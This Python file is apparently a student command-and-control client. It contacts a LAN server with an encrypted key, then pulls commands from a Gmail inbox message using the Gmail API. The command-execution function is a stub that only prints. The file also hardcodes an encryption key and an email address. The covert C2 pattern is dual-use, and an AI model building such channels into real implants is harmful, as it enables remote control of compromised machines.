from __future__ import print_function
import pickle
import os.path
from googleapiclient.discovery import build
from google_auth_oauthlib.flow import InstalledAppFlow
from google.auth.transport.requests import Request

# This is a Client side program that constantly sends a ping to server to ask if the server
# has any commands to run on the client. It keeps listening for response from server
# and whenever it receives commands from server, it runs on the machine.

# Server address = "192.168.1.152"
# Server port = 7000
# Client address = "192.168.1.160"
# Client port = 7000

# Using scapy to create a packet

from scapy.all import *
load_layer("tls")
import sys
from cryptography.fernet import Fernet
from time import sleep
from base64 import b64encode, b64decode

#Credentials to be entered
HOST = "192.168.1.152"  # host ip address
PORT = 443              # host tcp port
EMAIL_ADD = "himchan.yun@stonybrook.edu" # Enter your email address

def send_to_server(clientkey):
    pkt = IP()/TCP()
    pkt[IP].dst = "192.168.1.152" #"server Ip address"
    pkt[TCP].dport = 7000 #"server port"
    return pkt/clientkey
    # response = sr1(pkt/clientkey)
    # if response:
    #     return response[TCP].payload

def encrypt_payload(payload,key):
    encoded_payload = payload.encode()
    f = Fernet(key)
    return f.encrypt(encoded_payload)

def decrypt_payload(payload,key):
    f = Fernet(key)
    return f.decrypt(payload).decode()

def run_command(command):
    print("Command ({0}) is run successfully!!".format(command))
    return



# If modifying these scopes, delete the file token.pickle.
SCOPES = ['https://www.googleapis.com/auth/gmail.readonly']

def run_command(command):
    print("Command is run successfully: {0}".format(command))
    return

def main():
    clientkey = "0xaaaa"
    fernetkey = "PiffAUwQh2Rt0g4Bo_-yOiKNeHPrub3ljgER0CPqSwQ="
    email_add = ""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    con = s.connect((HOST,PORT))
    # print(type(encrypt_payload(clientkey,fernetkey)))
    s.send(encrypt_payload(clientkey,fernetkey))
    while True:
        received_msg = s.recv(65535)
        if len(received_msg) != 0:
            msg = decrypt_payload(received_msg,fernetkey)
            if(msg[:6] == clientkey):
                print("======= Receiveed Messages =======\n{0}\n============== Done ==============".format(msg))
                email_add = msg[6:]
                break
    if email_add == EMAIL_ADD:
        """Shows basic usage of the Gmail API.
        Lists the user's Gmail labels.
        """
        creds = None
        # The file token.pickle stores the user's access and refresh tokens, and is
        # created automatically when the authorization flow completes for the first
        # time.
        if os.path.exists('token.pickle'):
            with open('token.pickle', 'rb') as token:
                creds = pickle.load(token)
        # If there are no (valid) credentials available, let the user log in.
        if not creds or not creds.valid:
            if creds and creds.expired and creds.refresh_token:
                creds.refresh(Request())
            else:
                flow = InstalledAppFlow.from_client_secrets_file(
                    'credentials.json', SCOPES)
                creds = flow.run_local_server(port=0)
            # Save the credentials for the next run
            with open('token.pickle', 'wb') as token:
                pickle.dump(creds, token)

        service = build('gmail', 'v1', credentials=creds)

        # Get Messages
        results = service.users().messages().list(userId='me', labelIds=["INBOX"]).execute()
        messages = results.get('messages',[])
        commands_list = []
        
        if not messages:
            print('No messages found.!')
        else:
            print('Commands: ')
            for message in messages[:1]:
                msg = service.users().messages().get(userId='me', id=message['id']).execute()
                commands = msg['snippet']
                print(commands)
                commands_list = commands.split('\\n')
                print("\n")
                sleep(2)
        for command in commands_list:
            run_command(command)
    

if __name__ == '__main__':
    main()